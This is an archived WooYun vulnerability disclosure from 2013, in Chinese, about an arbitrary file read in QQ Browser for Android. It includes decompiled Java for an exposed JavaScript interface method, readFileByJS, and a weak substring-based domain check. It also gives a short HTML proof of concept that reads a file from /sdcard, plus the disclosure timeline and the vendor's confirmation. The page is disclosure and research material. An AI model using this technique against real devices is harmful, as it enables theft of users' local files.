@@ -1,0 +1,283 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ 浏览器 for android 任意文件读取漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ 浏览器 for android 任意文件读取漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的胖子">心伤的胖子</a> 
+</li><li>提交时间：		2013-10-22 16:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-11：	细节向普通白帽子公开<br/>
+									2013-11-21：	细节向实习白帽子公开<br/>
+									2013-12-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">咳咳，继续！<br />
+QQ 浏览器 for android 部分接口权限过大，存在可以读取任意文件的漏洞。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">webview 的漏洞让浏览器公开的 API 火了一把，不过时间如白驹过隙般“咻”的一下就过去了，webview 的代码执行漏洞是修了，可是 API 的安全问题貌似没有被关注啊。<br />
+<br />
+<br />
+<br />
+1、反编译 QQ 浏览器的 apk，然后通过老办法，搜索关键字“addJavascriptInterface”来查找都有哪些公开哪些接口给 JavsScript 调用。如下：<br />
+<br />
+</p><pre><code>localIX5WebView.addJavascriptInterface(this.ao, &quot;x5mtt&quot;);<br />
+localIX5WebView.addJavascriptInterface(new aw(localIX5WebView), &quot;mtt&quot;);<br />
+localIX5WebView.addJavascriptInterface(new aq(this), &quot;push&quot;);</code></pre><p class='detail'><br />
+<br />
+2、根据上面的跟进代码去看看接口都有些什么方法，这些方法都做了些什么？看到这个函数名 readFileByJS ，额，有戏呀，然后看代码<br />
+<br />
+</p><pre><code>public String readFileByJS(String s, long l, int i)<br />
+{<br />
+    String s1;<br />
+    s1 = null;<br />
+    break MISSING_BLOCK_LABEL_3;<br />
+_L1:<br />
+    byte abyte0[];<br />
+    do<br />
+        return s1;<br />
+    while(!checkQQDomain() || s == null || l &lt; 0L || i &lt; 0);<br />
+    abyte0 = new byte[i];<br />
+    FileInputStream fileinputstream = new FileInputStream(s);<br />
+    fileinputstream.skip(l);<br />
+    fileinputstream.read(abyte0);<br />
+    FileNotFoundException filenotfoundexception;<br />
+    Exception exception;<br />
+    IOException ioexception2;<br />
+    String s2;<br />
+    Exception exception1;<br />
+    if(fileinputstream != null)<br />
+        try<br />
+        {<br />
+            fileinputstream.close();<br />
+        }<br />
+        catch(IOException ioexception4) { }<br />
+    s2 = new String(abyte0, &quot;utf-8&quot;);<br />
+    s1 = s2;<br />
+      goto _L1<br />
+    filenotfoundexception;<br />
+    fileinputstream = null;<br />
+_L4:<br />
+    filenotfoundexception.printStackTrace();<br />
+    if(fileinputstream != null)<br />
+        try<br />
+        {<br />
+            fileinputstream.close();<br />
+        }<br />
+        catch(IOException ioexception1) { }<br />
+      goto _L1<br />
+    ioexception2;<br />
+    fileinputstream = null;<br />
+_L3:<br />
+    ioexception2.printStackTrace();<br />
+    if(fileinputstream != null)<br />
+        try<br />
+        {<br />
+            fileinputstream.close();<br />
+        }<br />
+        catch(IOException ioexception3) { }<br />
+      goto _L1<br />
+    exception1;<br />
+    fileinputstream = null;<br />
+    exception = exception1;<br />
+_L2:<br />
+    if(fileinputstream != null)<br />
+        try<br />
+        {<br />
+            fileinputstream.close();<br />
+        }<br />
+        catch(IOException ioexception) { }<br />
+    throw exception;<br />
+    UnsupportedEncodingException unsupportedencodingexception;<br />
+    unsupportedencodingexception;<br />
+      goto _L1<br />
+    exception;<br />
+      goto _L2<br />
+    ioexception2;<br />
+      goto _L3<br />
+    filenotfoundexception;<br />
+      goto _L4<br />
+}</code></pre><p class='detail'><br />
+<br />
+整个代码的逻辑是需要受这句代码 while(!checkQQDomain() || s == null || l &lt; 0L || i &lt; 0); 限制的，看checkQQDomain应该是判断是不是腾讯的域名，在其他代码中找到这个函数的定义：<br />
+<br />
+</p><pre><code>protected boolean checkQQDomain()<br />
+  {<br />
+    String str = this.mWebView.getUrl();<br />
+    if ((str.indexOf(&quot;.qq.com&quot;) != -1) || (str.indexOf(&quot;.soso.com&quot;) != -1) || (str.equalsIgnoreCase(&quot;qq.com&quot;)) || (str.equalsIgnoreCase(&quot;soso.com&quot;)));<br />
+    for (boolean bool = true; ; bool = false)<br />
+      return bool;<br />
+  }</code></pre><p class='detail'><br />
+<br />
+差不差，懂半拉。<br />
+<br />
+整个流程就是判断是不是 qq.com 或者 soso.com 的域名，如果是就读取文件，可以指定读取的开始位置以及指定的长度。<br />
+<br />
+3、手机上修改 hosts 文件随便解析一个 qq.com 的二级域名测试下（我找个xss估计也不会多给我分的），poc 代码如下：<br />
+<br />
+</p><pre><code>&lt;!DOCTYPE html&gt;<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br />
+&lt;title&gt;qq browser read file&lt;/title&gt;<br />
+&lt;body&gt;<br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+try{<br />
+        alert(x5mtt.readFileByJS(&quot;/sdcard/x5mtt.txt&quot;, 0, 10));<br />
+}catch(e){<br />
+        alert(e);<br />
+}<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+/sdcard/x5mtt.txt 是我自己测试生成的文件，然后我本地解析 victim.qq.com 域名，访问后如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/22165238a6854a54f55298e7adff1c95ad42e77a.png" target="_blank"><img src="../images/22165238a6854a54f55298e7adff1c95ad42e77a.png" alt="qq_xss_2.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/22165238a6854a54f55298e7adff1c95ad42e77a.png" target="_blank"><img src="../images/22165238a6854a54f55298e7adff1c95ad42e77a.png" alt="qq_xss_2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、严格控制这种接口的调用权限 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的胖子" title="心伤的胖子">心伤的胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040667" title="QQ 浏览器 for android 任意文件读取漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-10-22 17:17</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈，我们正在跟进处理中。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40667";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
